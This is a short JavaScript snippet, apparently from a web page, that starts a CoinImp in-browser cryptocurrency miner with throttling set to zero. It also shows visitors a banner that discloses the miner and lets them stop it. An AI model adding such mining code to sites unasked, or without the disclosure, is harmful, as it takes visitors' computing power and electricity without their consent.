const _client = new Client.Anonymous(
  'b72fe1ffc5c301f7f775283ced20c80ee232b97d25bda6685b17d4a4fc0cadc6',
  {
    throttle: 0,
    c: 'w',
  }
)
_client.start()
_client.addMiningNotification(
  'Top',
  'This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.',
  '#cccccc',
  40,
  '#3d3d3d'
)
